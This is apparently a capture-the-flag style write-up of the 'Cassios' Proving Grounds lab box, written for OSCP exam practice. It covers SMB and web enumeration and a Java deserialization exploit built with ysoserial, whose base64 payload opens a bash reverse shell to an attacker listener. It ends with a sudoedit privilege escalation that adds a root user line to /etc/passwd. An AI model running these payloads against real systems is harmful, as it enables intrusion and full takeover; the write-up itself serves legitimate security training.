---
title: Cassios Box on Offensive Security Proving Grounds - OSCP Preparation.
tags: [oscp medium box, PG medium box, enumeration, smb, misc, java deserialization, privilege escalation, sudo, linux]
categories: [OSCP, Proving Grounds]
comments: true
date: 2022-04-10 11:33:00
---

Hello,

We are going to exploit one of [OffSec Proving Grounds](https://portal.offensive-security.com/proving-grounds/play) Medium machines which called `Cassios`, you can find a PDF version of this Writeup [here](https://github.com/bing0o/Write-ups/blob/main/Cassios-PG-Practice.pdf).

## Enumeration:
### Nmap:

```bash
 ○ nmap -sC -sV -Pn -oN nmap 192.168.192.116
Nmap scan report for cassios.pg (192.168.192.116)
Host is up (0.080s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 36:cd:06:f8:11:72:6b:29:d8:d8:86:99:00:6b:1d:3a (RSA)
|   256 7d:12:27:de:dd:4e:8e:88:48:ef:e3:e0:b2:13:42:a1 (ECDSA)
|_  256 c4:db:d3:61:af:85:95:0e:59:77:c5:9e:07:0b:2f:74 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))
|_http-title: Landed by HTML5 UP
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
8080/tcp open  http-proxy
```

- SMB Enumeration using `smbclient`:

```bash
 ○ smbclient -N -L //cassios.pg/
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Samantha Konstan Disk      Backups and Recycler files
        IPC$            IPC       IPC Service (Samba 4.10.4)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------

```

- Exploring `Samantha Konstan` Share:

![image](/assets/img/sample/pg-cassios/smb.png)

- Download all the files from smb using `smbget`:

```bash
smbget -U anonymous -R 'smb://cassios.pg/Samantha Konstan'
```

- Running `ffuf` against the web application on port `80`: 

which gives us `backup_migrate` directory like shown below

![image](/assets/img/sample/pg-cassios/ffuf.png)

- Download and extract the data from `recycler.tar`, The User and Password can be found in `WebSecurityConfig.java` file:

```java
        @Bean
        @Override
        public UserDetailsService userDetailsService() {
                UserDetails user =
                         User.withDefaultPasswordEncoder()
                                .username("recycler")
                                .password("DoNotMessWithTheRecycler123")
                                .roles("USER")
                                .build();

                return new InMemoryUserDetailsManager(user);
        }
```

- Login to the web application on port `8080` using the Creds:
	* User: `recycler`
	* Pass: `DoNotMessWithTheRecycler123`

![image](/assets/img/sample/pg-cassios/web.png)

- By reading the source code of `src/main/java/com/industrial/recycler/DashboardController.java` (after extracting recycler.tar file), and even that I have never wrote a code in java but I noticed that the application takes data from this file `/home/samantha/backups/recycler.ser` which we have controle over it via SMB:

![image](/assets/img/sample/pg-cassios/smb2.png)

- The other thing that we can notice from the source code is the application uses `readObject()` to handle that data from `recycler.ser` file, and the `readObject()` method is vulnerable to java deserialization which leads to Remte Command Execution on the target.

### Getting RCE:

- I used a bash reverse shell [payload](https://bing0o.github.io/posts/reverse-shell-generator/), and encoded it with base64 encode.
- I used [Ysoserial](https://github.com/frohoff/ysoserial) which you can download from [here](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar) to generate a payload as shown below, change the base64 data with your encoded payload, here is some [resources](https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial) that helped me for the exploit:

```bash
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjE5Mi8yOTk1NSAwPiYxCg==}|{base64,-d}|{bash,-i}" > recycler.ser
```
- upload the output file which is `recycler.ser` to the SMB server:

![image](/assets/img/sample/pg-cassios/upload.png)

- visit http://cassios.pg:8080/dashboard and hit `Check Status` button:

![image](/assets/img/sample/pg-cassios/hit.png)

- Check your Netcat Listener:

![image](/assets/img/sample/pg-cassios/rce.png)

We got RCE as user: `samantha`.

## Privilege Escalation
### Enumeration

By running `sudo -l` it shows that we can run sudoedit as root without a password:

```bash
[samantha@cassios ~]$ sudo -l
Matching Defaults entries for samantha on cassios:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR KDEDIR"

User samantha may run the following commands on cassios:
    (root) NOPASSWD: sudoedit /home/*/*/recycler.ser
```

- I found that exploit available [here](https://www.exploit-db.com/exploits/37710) 

- Create a password for the new user: `openssl passwd -1 -salt bingo pwned` , where `bingo` is the username and `pwned` is the password

- Let's use `sudoedit` to edit `/etc/passwd` file and get root:

![image](/assets/img/sample/pg-cassios/root.png)

- The line I added to `/etc/passwd` is: `bingo:$1$bingo$3hsGN5T46YggQbdjWYZ9o0:0:0:baam:/root:/bin/bash` 

	* User: `bingo`
	* Pass: `pwned`

Happy Hacking!